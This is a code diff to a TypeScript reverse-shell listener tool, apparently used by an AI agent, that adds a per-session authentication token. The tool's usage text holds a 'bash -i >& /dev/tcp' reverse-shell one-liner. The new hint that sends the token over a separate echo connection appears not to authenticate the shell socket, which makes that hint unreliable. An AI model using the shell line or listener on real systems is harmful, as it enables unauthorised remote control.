@@ -8,6 +8,7 @@
 import * as net from 'net'
 import * as fs from 'fs'
 import * as path from 'path'
+import * as crypto from 'crypto'
 import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'
 import type { ResourceClaim } from '../core/executionRun.js'
 import { str } from '../core/strings.js'
@@ -20,6 +21,9 @@ interface ShellConn {
   connectedAt:  Date | null
   logFile:      string
   logStream:    fs.WriteStream | null
+  /** Round 26 (L2): per-session auth token — a connecting client must send
+   *  `auth <token>` as its first line before any traffic is accepted. */
+  authToken:    string
 }
 
 const _sessions = new Map<string, ShellConn>()
@@ -137,13 +141,50 @@ export class ShellSessionTool implements Tool {
           socket.destroy()
           return
         }
-        conn.socket      = socket
-        conn.connectedAt = new Date()
-        const connMsg = `\n[+] Shell connected from ${socket.remoteAddress}:${socket.remotePort}\n`
-        logStream.write(connMsg)
-        socket.on('data', (chunk) => logStream.write(chunk))
-        socket.on('close', () => { conn.socket = null; conn.connectedAt = null; logStream.write('\n[-] Shell disconnected\n') })
-        socket.on('error', () => { conn.socket = null; logStream.write('\n[!] Socket error\n') })
+        // Round 26 (L2): token handshake. Any local process could
+        // previously connect and impersonate the shell side, feeding
+        // fabricated output into the agent transcript. The client must
+        // now send `auth <token>` as its first line; until then all
+        // traffic is buffered and discarded on failure.
+        let authenticated = false
+        let authBuf = ''
+        const authTimeout = setTimeout(() => {
+          if (!authenticated) {
+            logStream.write('\n[!] Auth timeout — connection dropped\n')
+            socket.destroy()
+          }
+        }, 15_000)
+        authTimeout.unref?.()
+        socket.on('data', (chunk: Buffer) => {
+          if (authenticated) {
+            logStream.write(chunk)
+            return
+          }
+          authBuf += chunk.toString()
+          const nl = authBuf.indexOf('\n')
+          if (nl === -1) {
+            if (authBuf.length > 256) {
+              socket.destroy()
+            }
+            return
+          }
+          const line = authBuf.slice(0, nl).trim()
+          const rest = authBuf.slice(nl + 1)
+          if (line === `auth ${conn.authToken}`) {
+            authenticated = true
+            clearTimeout(authTimeout)
+            conn.socket = socket
+            conn.connectedAt = new Date()
+            logStream.write(`\n[+] Shell connected from ${socket.remoteAddress}:${socket.remotePort} (auth ok)\n`)
+            if (rest.length > 0) logStream.write(rest)
+          } else {
+            clearTimeout(authTimeout)
+            logStream.write('\n[!] Auth failed — connection dropped\n')
+            socket.destroy()
+          }
+        })
+        socket.on('close', () => { clearTimeout(authTimeout); conn.socket = null; conn.connectedAt = null; logStream.write('\n[-] Shell disconnected\n') })
+        socket.on('error', () => { clearTimeout(authTimeout); conn.socket = null; logStream.write('\n[!] Socket error\n') })
       })
 
       server.on('error', () => { _sessions.delete(id); logStream.end(); resolve({ content: `Failed to listen on port ${port}`, isError: true }) })
@@ -156,7 +197,8 @@ export class ShellSessionTool implements Tool {
       // SSH tunnel or a reverse proxy explicitly rather than getting one by
       // default.
       server.listen(port, '127.0.0.1', () => {
-        _sessions.set(id, { id, port, server, socket: null, connectedAt: null, logFile, logStream })
+        const authToken = crypto.randomBytes(16).toString('hex')
+        _sessions.set(id, { id, port, server, socket: null, connectedAt: null, logFile, logStream, authToken })
         // Lifecycle: this module keeps sessions in a module-global map with
         // no engine dispose hook. A ref'd listener would keep the CLI's
         // event loop alive forever after the caller forgets `action:"kill"`.
@@ -166,11 +208,12 @@ export class ShellSessionTool implements Tool {
         resolve({
           content: [
             `[ShellSession] Listening on 127.0.0.1:${port}  (session: ${id})`,
+            `Auth token: ${authToken}  — the connecting client MUST send \`auth ${authToken}\` as its first line`,
             `Log: ${logFile}`,
             ``,
             `On the remote machine, connect back via SSH tunnel or proxy:`,
             `  ssh -L ${port}:127.0.0.1:${port} user@gateway`,
-            `  bash -c 'bash -i >& /dev/tcp/127.0.0.1/${port} 0>&1'`,
+            `  bash -c 'bash -i >& /dev/tcp/127.0.0.1/${port} 0>&1'  # then: echo "auth ${authToken}" > /dev/tcp/127.0.0.1/${port}`,
             ``,
             `After connect: ShellSession({ action: "exec", session_id: "${id}", command: "id" })`,
           ].join('\n'),
